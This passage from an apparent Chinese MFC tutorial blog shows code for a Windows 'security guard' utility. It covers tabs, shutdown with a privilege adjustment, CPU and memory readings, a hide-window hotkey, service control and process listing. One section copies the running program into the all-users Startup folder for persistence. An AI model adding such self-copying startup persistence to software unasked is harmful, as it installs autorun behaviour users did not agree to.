创建选项，创建子窗口</span></span><br><span class="line">InsertItem(i, szTabItemName);</span><br><span class="line">pDlg-&gt;Create(dwId, <span class="keyword">this</span>);</span><br><span class="line"><span class="comment">//3 将子窗口移动合适的位置上</span></span><br><span class="line">CRect rc = &#123;&#125;;</span><br><span class="line">GetClientRect(&amp;rc);</span><br><span class="line"><span class="comment">//4 将矩形框，缩小一下，能够把Tab的表头 显示出来</span></span><br><span class="line">rc.DeflateRect(<span class="number">1</span>, <span class="number">23</span>, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line"><span class="comment">//5 移动</span></span><br><span class="line">pDlg-&gt;MoveWindow(rc);</span><br><span class="line">m_vecDlg.push_back(pDlg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">m_vecDlg[<span class="number">0</span>]-&gt;ShowWindow(SW_SHOW);</span><br><span class="line">va_end(vl);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//消息映射</span></span><br><span class="line">ON_NOTIFY_REFLECT(TCN_SELCHANGE, &amp;CMyTabDlg::OnTcnSelchange)</span><br><span class="line"><span class="comment">//类中声明</span></span><br><span class="line"><span class="function">afx_msg <span class="keyword">void</span> <span class="title">OnTcnSelchange</span><span class="params">(NMHDR* pNMHDR, LRESULT* pResult)</span></span>;</span><br><span class="line"><span class="comment">//响应Tab控件的切换</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMyTabDlg::OnTcnSelchange</span><span class="params">(NMHDR* pNMHDR, LRESULT* pResult)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> nSel = GetCurSel();</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m_vecDlg.size(); i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (i == nSel)</span><br><span class="line">&#123;</span><br><span class="line">m_vecDlg[i]-&gt;ShowWindow(SW_SHOW);</span><br><span class="line"></span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">m_vecDlg[i]-&gt;ShowWindow(SW_HIDE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">*pResult = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//主类中的绑定</span></span><br><span class="line">CMyTabDlg m_objTabDlg;<span class="comment">//主类中控件的声明定义</span></span><br><span class="line">DDX_Control(pDX, IDC_TAB1, m_objTabDlg);<span class="comment">//控件的绑定</span></span><br><span class="line"><span class="comment">//主类的调用</span></span><br><span class="line">m_objTabDlg.InitTab(<span class="number">7</span>,</span><br><span class="line"><span class="string">L&quot;我的电脑&quot;</span>, <span class="keyword">new</span> CMyComputerDlg(), IDD_COMPUTER,</span><br><span class="line"><span class="string">L&quot;LOAD_PE&quot;</span>,<span class="keyword">new</span> CMyLoadPeDlg(),IDD_LOADPE,</span><br><span class="line"><span class="string">L&quot;清理&quot;</span>, <span class="keyword">new</span> CMySystemDlg(), IDD_SYSTEMINFO,</span><br><span class="line"><span class="string">L&quot;程序&quot;</span>, <span class="keyword">new</span> CMyInstallDlg(), IDD_INSTALL,</span><br><span class="line"><span class="string">L&quot;服务&quot;</span>, <span class="keyword">new</span> CMyServicesDlg(), IDD_SERVICES,</span><br><span class="line"><span class="string">L&quot;启动项&quot;</span>, <span class="keyword">new</span> CMyStartItemDlg(), IDD_STARTITEM,</span><br><span class="line"><span class="string">L&quot;查杀&quot;</span>, <span class="keyword">new</span> CMyAntivirusDlg(), IDD_ANTIVIRUS</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h2 id="关机、注销、锁屏、重启"><a href="#关机、注销、锁屏、重启" class="headerlink" title="关机、注销、锁屏、重启"></a>关机、注销、锁屏、重启</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> ID_32784:<span class="comment">//关机</span></span><br><span class="line">SetSystem();</span><br><span class="line">ExitWindowsEx(EWX_POWEROFF | EWX_FORCE, SHTDN_REASON_FLAG_USER_DEFINED);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> ID_32785:<span class="comment">//重启</span></span><br><span class="line">SetSystem();</span><br><span class="line">ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_FLAG_USER_DEFINED);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> ID_32786:<span class="comment">//注销</span></span><br><span class="line">ExitWindowsEx(EWX_LOGOFF | EWX_FORCE, SHTDN_REASON_FLAG_USER_DEFINED);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> ID_32787:<span class="comment">//锁屏</span></span><br><span class="line">LockWorkStation();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//关机、重启所需要调用的提权函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CSecurityguardDlg::SetSystem</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HANDLE hTOken = <span class="literal">NULL</span>;</span><br><span class="line">HANDLE hProcess = GetCurrentProcess();<span class="comment">//获取进程伪句柄</span></span><br><span class="line">OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hTOken);</span><br><span class="line">TOKEN_PRIVILEGES tp = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">LookupPrivilegeValue(<span class="number">0</span>, SE_SHUTDOWN_NAME, &amp;tp.Privileges[<span class="number">0</span>].Luid);</span><br><span class="line">tp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">tp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">AdjustTokenPrivileges(hTOken, FALSE, &amp;tp, <span class="keyword">sizeof</span>(tp), <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CPU、内存的占有率获取"><a href="#CPU、内存的占有率获取" class="headerlink" title="CPU、内存的占有率获取"></a>CPU、内存的占有率获取</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//用于辅助CPU的获取（时间换算）</span></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">FILETIME2Double</span><span class="params">(<span class="keyword">const</span> _FILETIME&amp; filetime)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">double</span>(filetime.dwHighDateTime * <span class="number">4.294967296e9</span>)</span><br><span class="line">+ <span class="keyword">double</span>(filetime.dwLowDateTime);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//CPU占用率获取</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">CSecurityguardDlg::GetCpusage</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//          空闲时间   内核时间     用户时间</span></span><br><span class="line">_FILETIME idleTime, kernelTime, userTime;</span><br><span class="line"><span class="comment">//获取时间</span></span><br><span class="line">GetSystemTimes(&amp;idleTime, &amp;kernelTime, &amp;userTime);</span><br><span class="line"></span><br><span class="line">HANDLE hEvent = CreateEvent(<span class="literal">NULL</span>, FALSE, FALSE, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//等待1000毫秒</span></span><br><span class="line">WaitForSingleObject(hEvent, <span class="number">50</span>);</span><br><span class="line"><span class="comment">//获取新时间</span></span><br><span class="line">_FILETIME newTime, newKerneTime, newUserTime;</span><br><span class="line">GetSystemTimes(&amp;newTime, &amp;newKerneTime, &amp;newUserTime);</span><br><span class="line"><span class="comment">//将各个时间转换</span></span><br><span class="line"><span class="keyword">double</span> dOldIdleTime = FILETIME2Double(idleTime);</span><br><span class="line"><span class="keyword">double</span> dNewIdleTime = FILETIME2Double(newTime);</span><br><span class="line"><span class="keyword">double</span> dOldKernelTime = FILETIME2Double(kernelTime);</span><br><span class="line"><span class="keyword">double</span> dNewKernelTime = FILETIME2Double(newKerneTime);</span><br><span class="line"><span class="keyword">double</span> dOldUserTime = FILETIME2Double(userTime);</span><br><span class="line"><span class="keyword">double</span> dNewUserTime = FILETIME2Double(newUserTime);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">int</span>(<span class="number">100.0</span> - (dNewIdleTime - dOldIdleTime) / (dNewKernelTime - dOldKernelTime + dNewUserTime - dOldUserTime) * <span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//内存占用率获取</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CSecurityguardDlg::GetMemsage</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">MEMORYSTATUS memStatus;</span><br><span class="line">GlobalMemoryStatus(&amp;memStatus);</span><br><span class="line">CString strmery;</span><br><span class="line">strmery.Format(<span class="string">L&quot;内存占用率: %d%%&quot;</span>, memStatus.dwMemoryLoad);</span><br><span class="line">m_strMem.SetString(strmery);<span class="comment">//在文本上显示</span></span><br><span class="line">UpdateData(FALSE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="老板键的注册与响应"><a href="#老板键的注册与响应" class="headerlink" title="老板键的注册与响应"></a>老板键的注册与响应</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">ON_WM_HOTKEY()<span class="comment">//消息映射</span></span><br><span class="line"><span class="comment">//类中声明</span></span><br><span class="line"><span class="function">afx_msg <span class="keyword">void</span> <span class="title">OnHotKey</span><span class="params">(UINT nHotKeyId, UINT nKey1, UINT nKey2)</span></span>;</span><br><span class="line"><span class="comment">//注册老板键//响应注册的按键Ctrl + Shift + Z </span></span><br><span class="line">::RegisterHotKey(</span><br><span class="line">m_hWnd,<span class="comment">//响应热键的窗口句柄</span></span><br><span class="line"><span class="number">0x1234</span>,<span class="comment">//热键ID，自定义ID值</span></span><br><span class="line">MOD_CONTROL | MOD_SHIFT,<span class="comment">//辅助按键</span></span><br><span class="line"><span class="string">&#x27;Z&#x27;</span><span class="comment">//键值，按键码</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//老板键的响应</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CSecurityguardDlg::OnHotKey</span><span class="params">(UINT nHotKeyId, UINT nKey1, UINT nKey2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (i == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">ShowWindow(SW_HIDE);<span class="comment">//隐藏</span></span><br><span class="line">i = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">ShowWindow(SW_SHOW);<span class="comment">//显示</span></span><br><span class="line">&#125;</span><br><span class="line">CDialogEx::OnHotKey(nHotKeyId, nKey1, nKey2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="程序的自我复制"><a href="#程序的自我复制" class="headerlink" title="程序的自我复制"></a>程序的自我复制</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 复制到开机启动路径</span></span><br><span class="line">LPCTSTR targetPath = _T(<span class="string">&quot;C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\安全卫士.exe&quot;</span>); </span><br><span class="line">CopyMyselfTo(targetPath);</span><br><span class="line"></span><br><span class="line"><span class="comment">//自我复制</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CSecurityguardDlg::CopyMyselfTo</span><span class="params">(LPCTSTR targetPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">TCHAR tcBuf[_MAX_PATH]; <span class="comment">// 缓冲区</span></span><br><span class="line">   <span class="comment">// 取自己程序的程序名</span></span><br><span class="line">::GetModuleFileName(<span class="literal">NULL</span>, tcBuf, <span class="keyword">sizeof</span>(tcBuf));</span><br><span class="line"><span class="comment">// 复制文件</span></span><br><span class="line">::CopyFile(tcBuf, targetPath, FALSE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="计时器的设置与响应"><a href="#计时器的设置与响应" class="headerlink" title="计时器的设置与响应"></a>计时器的设置与响应</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">ON_WM_TIMER()<span class="comment">//消息映射</span></span><br><span class="line"><span class="comment">//类中声明</span></span><br><span class="line"><span class="function">afx_msg <span class="keyword">void</span> <span class="title">OnTimer</span><span class="params">(UINT_PTR nIDEvent)</span></span>;</span><br><span class="line"><span class="comment">// 设置计时器</span></span><br><span class="line">SetTimer(</span><br><span class="line"><span class="number">1</span>,   <span class="comment">//自定义的Timer的ID</span></span><br><span class="line"><span class="number">1000</span>, <span class="comment">//间隔的毫秒数</span></span><br><span class="line"><span class="literal">NULL</span> <span class="comment">//回调函数，如果设置了，每隔500毫秒调这个回调函数</span></span><br><span class="line">); <span class="comment">//如果没有设置，就是给主窗口发WM_TIMER消息</span></span><br><span class="line">SetTimer(</span><br><span class="line"><span class="number">2</span>,   <span class="comment">//自定义的Timer的ID</span></span><br><span class="line"><span class="number">1000</span>, <span class="comment">//间隔的毫秒数</span></span><br><span class="line"><span class="literal">NULL</span> <span class="comment">//回调函数，如果设置了，每隔500毫秒调这个回调函数</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">//响应计时器</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CSecurityguardDlg::OnTimer</span><span class="params">(UINT_PTR nIDEvent)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (nIDEvent == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">CString str;</span><br><span class="line">str.Format(<span class="string">L&quot;CPU占用率：%d%%&quot;</span>, GetCpusage());</span><br><span class="line">m_strCpu.SetString(str);</span><br><span class="line">UpdateData(FALSE);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (nIDEvent == <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">GetMemsage();</span><br><span class="line">&#125;</span><br><span class="line">CDialogEx::OnTimer(nIDEvent);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="右击菜单的响应"><a href="#右击菜单的响应" class="headerlink" title="右击菜单的响应"></a>右击菜单的响应</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//消息映射</span></span><br><span class="line">ON_NOTIFY(NM_RCLICK, IDC_SERVICES, &amp;CMyServicesDlg::OnRclickServices)</span><br><span class="line"><span class="comment">//类中声明</span></span><br><span class="line"><span class="function">afx_msg <span class="keyword">void</span> <span class="title">OnRclickServices</span><span class="params">(NMHDR* pNMHDR, LRESULT* pResult)</span></span>;</span><br><span class="line"><span class="comment">//右击弹出菜单</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMyServicesDlg::OnRclickServices</span><span class="params">(NMHDR* pNMHDR, LRESULT* pResult)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">LPNMITEMACTIVATE pNMItemActivate = <span class="keyword">reinterpret_cast</span>&lt;LPNMITEMACTIVATE&gt;(pNMHDR);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 需要载入菜单资源</span></span><br><span class="line">CMenu obj;</span><br><span class="line">obj.LoadMenuW(IDR_MENU3);</span><br><span class="line"><span class="comment">//坐标转换</span></span><br><span class="line">POINT pt = &#123; pNMItemActivate-&gt;ptAction.x,pNMItemActivate-&gt;ptAction.y&#125;;</span><br><span class="line">ClientToScreen(&amp;pt);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取一个下拉菜单</span></span><br><span class="line">CMenu* pSubMenu1 = obj.GetSubMenu(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 弹出菜单</span></span><br><span class="line">pSubMenu1-&gt;TrackPopupMenu(TPM_LEFTALIGN, pt.x, pt.y, <span class="keyword">this</span>);</span><br><span class="line"><span class="comment">//获取ID（选择的进程）</span></span><br><span class="line"><span class="keyword">int</span> item = pNMItemActivate-&gt;iItem;  <span class="comment">//LPNMITEMACTIVATF 这个结构体 iItem 有列表框记录的信息</span></span><br><span class="line">strName = m_objServices.GetItemText(item, <span class="number">0</span>);  <span class="comment">//获取文本框</span></span><br><span class="line"></span><br><span class="line">*pResult = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//消息映射</span></span><br><span class="line">ON_COMMAND_RANGE(ID_32789, ID_32790, &amp;CMyServicesDlg::OnRangeCmds1)</span><br><span class="line"><span class="comment">//类中声明</span></span><br><span class="line"><span class="function">afx_msg <span class="keyword">void</span> <span class="title">OnRangeCmds1</span><span class="params">(UINT nMenuID)</span></span>;</span><br><span class="line"><span class="comment">//响应弹出菜单</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMyServicesDlg::OnRangeCmds1</span><span class="params">(UINT nMenuID)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//获取服务的开启与结束需要的相应权限的句柄</span></span><br><span class="line">SC_HANDLE hScMess = OpenSCManagerW(<span class="literal">NULL</span>, <span class="literal">NULL</span>, SC_MANAGER_ALL_ACCESS);</span><br><span class="line">SC_HANDLE hService = OpenService(hScMess,strName,SC_MANAGER_ALL_ACCESS</span><br><span class="line">);</span><br><span class="line"><span class="keyword">switch</span> (nMenuID)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> ID_32789:<span class="comment">//开启服务</span></span><br><span class="line">StartService(hService, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> ID_32790:<span class="comment">//结束服务</span></span><br><span class="line">SERVICE_STATUS_PROCESS ssp;</span><br><span class="line">ControlService(hService, SERVICE_CONTROL_STOP, (LPSERVICE_STATUS)&amp;ssp);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="管理员运行无法拖拽"><a href="#管理员运行无法拖拽" class="headerlink" title="管理员运行无法拖拽"></a>管理员运行无法拖拽</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//解决管理员无法拖拽</span></span><br><span class="line">ChangeWindowMessageFilter(WM_DROPFILES, MSGFLT_ADD);</span><br><span class="line">ChangeWindowMessageFilter(<span class="number">0x0049</span>, MSGFLT_ADD);</span><br></pre></td></tr></table></figure><h2 id="响应拖拽"><a href="#响应拖拽" class="headerlink" title="响应拖拽"></a>响应拖拽</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//响应文件拖拽</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMyLoadPeDlg::OnDropFiles</span><span class="params">(HDROP hDropInfo)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 存放文件路径</span></span><br><span class="line"><span class="keyword">wchar_t</span> filePath[MAX_PATH] = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取拖拽文件的路径</span></span><br><span class="line">DragQueryFile(hDropInfo, <span class="number">0</span>, filePath, MAX_PATH);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">CDialogEx::OnDropFiles(hDropInfo);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="进程遍历"><a href="#进程遍历" class="headerlink" title="进程遍历"></a>进程遍历</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//遍历进程</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMyLoadPeDlg::EnumProcess</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">m_vecProcess.clear();</span><br><span class="line">    CString cs;</span><br><span class="line">HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">PROCESSENTRY32 pe = &#123; <span class="keyword">sizeof</span>(pe) &#125;;</span><br><span class="line"><span class="keyword">if</span> (Process32First(hSnap, &amp;pe))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">PROCESS* stcPro = <span class="keyword">new</span> PROCESS;</span><br><span class="line"></span><br><span class="line">GetPathByProcessId(pe.th32ProcessID, stcPro);</span><br><span class="line">cs = szPath;<span class="comment">//WCHAR*[MAX+PATH]无法直接与L&quot;&quot;比较（类型不符），所以这里需要转换一下</span></span><br><span class="line"><span class="keyword">if</span> (cs==<span class="string">L&quot;&quot;</span>)<span class="comment">//如果路径为空直接输出进程名</span></span><br><span class="line">&#123;</span><br><span class="line">m_objProcessList.InsertItem(i, pe.szExeFile, i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">SHFILEINFO info = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">CString temp = szPath;</span><br><span class="line">SHGetFileInfo(temp, <span class="number">0</span>, &amp;info, <span class="keyword">sizeof</span>(&amp;info), SHGFI_DISPLAYNAME | SHGFI_ICON);</span><br><span class="line">m_ImageList.Add(info.hIcon);</span><br><span class="line"><span class="keyword">if</span> (info.hIcon == <span class="literal">NULL</span>)<span class="comment">//如果图标没有获取到，则直接输出进程名</span></span><br><span class="line">&#123;</span><br><span class="line">m_objProcessList.InsertItem(i, pe.szExeFile, i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">m_objProcessList.InsertItem(i, info.szDisplayName, i);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 转换成字符串格式</span></span><br><span class="line"><span class="keyword">wchar_t</span> tmp[<span class="number">100</span>] = &#123;&#125;;</span><br><span class="line">wsprintf(tmp, <span class="string">L&quot;%d&quot;</span>, pe.th32ProcessID);</span><br><span class="line"></span><br><span class="line">m_objProcessList.SetItemText(i, <span class="number">1</span>, tmp);</span><br><span class="line"></span><br><span class="line">cs.Format(<span class="string">L&quot;%d&quot;</span>, pe.cntThreads);</span><br><span class="line">m_objProcessList.SetItemText(i, <span class="number">2</span>, cs);</span><br><span class="line"></span><br><span class="line">m_objProcessList.SetItemText(i, <span class="number">3</span>, <span class="string">L&quot;正在运行&quot;</span>);</span><br><span class="line"><span class="comment">//使用vector保存进程名和id</span></span><br><span class="line">cs = szPath;</span><br><span class="line">m_objProcessList.SetItemText(i, <span class="number">4</span>, cs);</span><br><span class="line">stcPro-&gt;csProcessName = pe.szExeFile;</span><br><span class="line">stcPro-&gt;dwProcessId = pe.th32ProcessID;</span><br><span class="line">stcPro-&gt;csProcessPath = szPath;</span><br><span class="line">m_vecProcess.push_back(stcPro);</span><br><span class="line">i++;</span><br><span class="line"></span><br><span class="line">&#125; <span 